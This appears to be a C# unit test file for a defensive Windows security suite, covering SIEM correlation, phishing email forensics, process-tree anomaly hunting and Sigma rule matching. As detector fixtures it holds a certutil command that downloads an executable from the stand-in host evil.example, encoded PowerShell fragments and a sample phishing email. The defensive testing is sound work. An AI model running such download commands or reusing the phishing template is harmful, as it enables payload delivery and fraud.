using System.Text;
using Becetti.Security.Core.Models;
using Becetti.Security.Core.Services;

namespace Becetti.Security.Core.Tests;

/// <summary>
/// Deterministic unit tests verifying all 12 Enterprise Mega-Suite Core Services
/// (SIEM correlation, LAN ARP parsing, Privacy Cleaner, SOAR config persistence,
/// Root CA Auditor, Vault Pro AES-256-GCM file &amp; folder encryption, EML Phishing Forensics,
/// Process Tree Anomaly Hunter, Sigma YAML parser &amp; matcher, DNS cache parser,
/// Cloud Fleet Dashboard honest state, and CIS/NIST Compliance report export).
/// </summary>
public sealed class MegaSuiteServicesTests : IDisposable
{
    private readonly string _tempDir;

    public MegaSuiteServicesTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), "becetti-megasuite-tests-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_tempDir);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_tempDir))
                Directory.Delete(_tempDir, recursive: true);
        }
        catch { }
    }

    // #1 Local SIEM Correlation
    [Fact]
    public void LocalSiem_Correlate_FlagsBruteForceAndLogClearingAndSuspiciousPowerShell()
    {
        var now = DateTimeOffset.UtcNow;
        var events = new List<SiemEventEntry>();
        for (int i = 0; i < 6; i++)
            events.Add(new SiemEventEntry { LogName = "Security", EventId = 4625, Timestamp = now.AddMinutes(-i), Message = "An account failed to log on." });

        events.Add(new SiemEventEntry { LogName = "Security", EventId = 1102, Timestamp = now, Message = "The audit log was cleared." });
        events.Add(new SiemEventEntry { LogName = "PowerShell", EventId = 4104, Timestamp = now, Message = "powershell -EncodedCommand SQBFAFgA" });

        var incidents = LocalSiemService.CorrelateEvents(events);

        Assert.Contains(incidents, i => i.MitreTechniqueId == "T1110");
        Assert.Contains(incidents, i => i.MitreTechniqueId == "T1070.001" && i.Severity == "Critical");
        Assert.Contains(incidents, i => i.MitreTechniqueId == "T1059.001");
    }

    // #2 LAN ARP Discovery Parser
    [Fact]
    public void LanDiscovery_ParseArpOutput_ExtractsDynamicLanDevicesOnly()
    {
        var sampleArp = """
            Interface: 192.168.1.25 --- 0xc
              Internet Address      Physical Address      Type
              192.168.1.1           aa-bb-cc-dd-ee-01     dynamic
              192.168.1.42          11-22-33-44-55-66     dynamic
              224.0.0.22            01-00-5e-00-00-16     static
              255.255.255.255       ff-ff-ff-ff-ff-ff     static
            """;

        var devices = LanDiscoveryService.ParseArpOutput(sampleArp, new HashSet<string> { "192.168.1.1" });
        Assert.Equal(2, devices.Count);
        Assert.Contains(devices, d => d.IpAddress == "192.168.1.1" && d.MacAddress == "AA-BB-CC-DD-EE-01" && d.RespondedToPing);
        Assert.Contains(devices, d => d.IpAddress == "192.168.1.42" && d.MacAddress == "11-22-33-44-55-66");
    }

    // #3 Privacy Cleaner
    [Fact]
    public async Task PrivacyCleaner_ScanTracesAsync_ReturnsStructuredCategories()
    {
        var cleaner = new PrivacyCleanerService();
        var res = await cleaner.ScanReclaimableTracesAsync();
        Assert.True(res.Success);
        Assert.NotNull(res.Value);
        Assert.True(res.Value!.Count >= 6);
        Assert.Contains(res.Value, c => c.Id == "win-temp");
        Assert.Contains(res.Value, c => c.Id == "win-recent");
    }

    // #4 SOAR Playbook Config Persistence
    [Fact]
    public async Task SoarPlaybook_SavesAndReloadsConfig()
    {
        var settings = new SettingsService(_tempDir);
        var fw = new PerAppFirewallService();
        var quar = new QuarantineService(settings);
        var yara = new YaraEngineService(new HttpClient(), settings);
        var net = new NetworkMonitorService();
        var pers = new PersistenceHunterService(new FileForensicsService());
        var hard = new WindowsHardeningService();
        var hosts = new HostsDnsGuardService();
        var cam = new CameraMicAuditorService();
        var evLog = new EventLogService(_tempDir);
        var evidence = new IncidentEvidenceService(yara, net, pers, hosts, cam, hard, quar, evLog);

        var soar = new SoarPlaybookService(settings, quar, fw, evidence, evLog);
        var saveRes = await soar.SaveConfigAsync(new SoarPlaybookConfig
        {
            Enabled = true,
            KillMaliciousProcess = true,
            BlockExecutableInFirewall = true,
            AutoQuarantineOnCritical = false,
            GenerateForensicEvidenceZip = true
        });
        Assert.True(saveRes.Success);

        var reloaded = new SoarPlaybookService(settings, quar, fw, evidence, evLog);
        var loadRes = await reloaded.LoadConfigAsync();
        Assert.True(loadRes.Success);
        Assert.True(reloaded.CurrentConfig.KillMaliciousProcess);
        Assert.True(reloaded.CurrentConfig.BlockExecutableInFirewall);
        Assert.False(reloaded.CurrentConfig.AutoQuarantineOnCritical);
    }

    // #5 Root Certificate Auditor
    [Fact]
    public async Task RootCertAuditor_CompletesAuditWithoutThrowing()
    {
        var auditor = new RootCertAuditorService();
        var res = await auditor.AuditRootCertificatesAsync();
        Assert.True(res.Success);
        Assert.NotNull(res.Value);
    }

    // #6 Encrypted File & Folder Vault Pro (AES-256-GCM + PBKDF2-310K)
    [Fact]
    public async Task VaultPro_EncryptsAndDecryptsFileAndFolder_AndRejectsWrongPassphrase()
    {
        var settings = new SettingsService(_tempDir);
        var vault = new VaultProService(settings);

        var pwd = vault.GenerateStrongPassword(24);
        Assert.Equal(24, pwd.Length);

        // Single file roundtrip
        var srcFile = Path.Combine(_tempDir, "secret-notes.txt");
        await File.WriteAllTextAsync(srcFile, "TOP SECRET BECETTI PAYLOAD 2026");

        var sealedRes = await vault.SealFileOrFolderAsync(srcFile, pwd);
        Assert.True(sealedRes.Success);
        Assert.NotNull(sealedRes.Value);
        Assert.False(sealedRes.Value!.IsFolderArchive);

        // Wrong passphrase must fail AES-GCM auth
        var outWrong = Path.Combine(_tempDir, "out-wrong");
        var badRes = await vault.UnsealItemAsync(sealedRes.Value.Id, "WrongPassphrase999!", outWrong);
        Assert.False(badRes.Success);
        Assert.Equal("BAD_PASSPHRASE", badRes.ErrorCode);

        // Correct passphrase restores exact bytes
        var outRight = Path.Combine(_tempDir, "out-right");
        var okRes = await vault.UnsealItemAsync(sealedRes.Value.Id, pwd, outRight);
        Assert.True(okRes.Success);
        Assert.Equal("TOP SECRET BECETTI PAYLOAD 2026", await File.ReadAllTextAsync(okRes.Value!));

        // Whole folder roundtrip
        var srcDir = Path.Combine(_tempDir, "confidential-folder");
        Directory.CreateDirectory(srcDir);
        await File.WriteAllTextAsync(Path.Combine(srcDir, "a.txt"), "alpha");
        await File.WriteAllTextAsync(Path.Combine(srcDir, "b.txt"), "beta");

        var sealedDir = await vault.SealFileOrFolderAsync(srcDir, pwd);
        Assert.True(sealedDir.Success);
        Assert.True(sealedDir.Value!.IsFolderArchive);

        var outDir = Path.Combine(_tempDir, "out-folder");
        var unsealDir = await vault.UnsealItemAsync(sealedDir.Value.Id, pwd, outDir);
        Assert.True(unsealDir.Success);
        Assert.Equal("alpha", await File.ReadAllTextAsync(Path.Combine(outDir, "confidential-folder", "a.txt")));
    }

    // #7 EML Email Phishing & Header Forensics
    [Fact]
    public void EmailForensics_DetectsSpfDkimDmarcFailAndReplyToSpoofingAndAttachment()
    {
        var settings = new SettingsService(_tempDir);
        var feeds = new ThreatFeedService(new HttpClient(), settings);
        var emailSvc = new EmailForensicsService(feeds);

        var rawEml = """
            From: "Bank Security" <alerts@trusted-bank.com>
            Reply-To: hacker@phish-domain.xyz
            Return-Path: <bounce@unknown-relay.ru>
            Subject: Urgent Account Verification
            Authentication-Results: mx.example.com; spf=fail; dkim=fail; dmarc=fail
            Received: from evil.relay (198.51.100.7) by mx.example.com

            Please click https://xn--bank-login-99a.example/verify immediately.
            Content-Disposition: attachment; filename="invoice_2026.exe"
            """;

        var report = emailSvc.AnalyzeRawEml(rawEml, "phish.eml");
        Assert.Equal("fail", report.SpfStatus);
        Assert.Equal("fail", report.DkimStatus);
        Assert.Equal("fail", report.DmarcStatus);
        Assert.True(report.RiskScore >= 80);
        Assert.Contains(report.Findings, f => f.Contains("Reply-To domain mismatch", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(report.Findings, f => f.Contains("Punycode/IDN", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(report.Findings, f => f.Contains("Dangerous executable", StringComparison.OrdinalIgnoreCase));
    }

    // #8 Process Tree Parent-Child Anomaly Hunter
    [Fact]
    public void ProcessTreeHunter_FlagsOfficeSpawningPowerShellAndUnsignedTempBinary()
    {
        var officeSpawn = ProcessTreeHunterService.EvaluateAnomaly(
            "WINWORD.EXE", "powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell -enc AAA", isSigned: true);
        Assert.True(officeSpawn.IsAnomaly);
        Assert.Equal("T1059", officeSpawn.Mitre);

        var tempBin = ProcessTreeHunterService.EvaluateAnomaly(
            "explorer.exe", "dropper.exe", @"C:\Users\Alice\AppData\Local\Temp\dropper.exe",
            "dropper.exe", isSigned: false);
        Assert.True(tempBin.IsAnomaly);
        Assert.Equal("T1204.002", tempBin.Mitre);
    }

    // #9 Sigma Rule Scanner YAML Parser & Evaluator
    [Fact]
    public void SigmaScanner_ParsesCustomYamlAndMatchesWindowsEvent()
    {
        var yaml = """
            title: Suspicious Certutil Download
            id: custom-001
            level: high
            tags:
              - attack.t1105
            detection:
              keywords:
                - 'certutil -urlcache'
                - 'split -f'
            """;

        var rule = SigmaRuleScannerService.ParseSigmaYaml(yaml, "certutil.yml");
        Assert.NotNull(rule);
        Assert.Equal("Suspicious Certutil Download", rule!.Title);
        Assert.Equal("T1105", rule.MitreTechniqueId);

        var evs = new[]
        {
            new SiemEventEntry
            {
                LogName = "PowerShell",
                EventId = 4104,
                Timestamp = DateTimeOffset.UtcNow,
                Message = "certutil -urlcache -split -f http://evil.example/a.exe"
            }
        };

        var matches = SigmaRuleScannerService.EvaluateRules(new[] { rule }, evs);
        Assert.Single(matches);
        Assert.Equal("T1105", matches[0].MitreTechniqueId);
    }

    // #10 Live DNS Cache Parser
    [Fact]
    public void NetworkDnsMonitor_ParseDnsCacheJson_ExtractsDomainsAndTtl()
    {
        var settings = new SettingsService(_tempDir);
        var feeds = new ThreatFeedService(new HttpClient(), settings);
        var json = """[{"Entry":"github.com","Data":"140.82.121.4","TimeToLive":60},{"Entry":"api.becetti.dev","Data":"1.1.1.1","TimeToLive":120}]""";

        var entries = NetworkDnsMonitorService.ParseDnsCacheJson(json, feeds);
        Assert.Equal(2, entries.Count);
        Assert.Contains(entries, e => e.Domain == "github.com" && e.TtlSeconds == 60);
    }

    // #11 Fleet Dashboard Honest Unconfigured State
    [Fact]
    public async Task FleetDashboard_WhenCloudNotConfigured_ReturnsHonestUnconfiguredReport()
    {
        var settings = new SettingsService(_tempDir);
        var cloud = new CloudService(new HttpClient(), settings, new TokenStore(_tempDir));
        var updater = new AppUpdaterService(new HttpClient());
        var fleet = new FleetDashboardService(cloud, settings, updater);

        var res = await fleet.LoadFleetAsync();
        Assert.True(res.Success);
        Assert.NotNull(res.Value);
        Assert.False(res.Value!.CloudConfigured);
        Assert.Empty(res.Value.Devices);
    }

    // #12 Compliance Center HTML & JSON Export
    [Fact]
    public async Task ComplianceCenter_ExportsValidHtmlAndJsonReports()
    {
        var settings = new SettingsService(_tempDir);
        var comp = new ComplianceCenterService(
            new DefenderService(),
            new WindowsHardeningService(),
            new WindowsPrivacyHardenerService(),
            new RootCertAuditorService(),
            new ThreatFeedService(new HttpClient(), settings));

        var sample = new ComplianceAuditReport
        {
            MachineName = "SEC-LAB-01",
            PassedCount = 8,
            WarningCount = 1,
            FailedCount = 1,
            ComplianceScorePercent = 85,
            Summary = "Compliance Score: 85%",
            Controls = new[]
            {
                new ComplianceControlResult
                {
                    ControlId = "CIS-18.10.43",
                    Framework = "CIS Win11",
                    Title = "Defender Real-Time Protection",
                    Status = "Pass",
                    Evidence = "Verified ON",
                    Remediation = "None"
                }
            }
        };

        var htmlPath = Path.Combine(_tempDir, "compliance.html");
        var jsonPath = Path.Combine(_tempDir, "compliance.json");

        var htmlRes = await comp.ExportComplianceHtmlReportAsync(sample, htmlPath);
        var jsonRes = await comp.ExportComplianceJsonReportAsync(sample, jsonPath);

        Assert.True(htmlRes.Success);
        Assert.True(jsonRes.Success);
        Assert.Contains("CIS-18.10.43", await File.ReadAllTextAsync(htmlPath, Encoding.UTF8));
        Assert.Contains("SEC-LAB-01", await File.ReadAllTextAsync(jsonPath, Encoding.UTF8));
    }
}
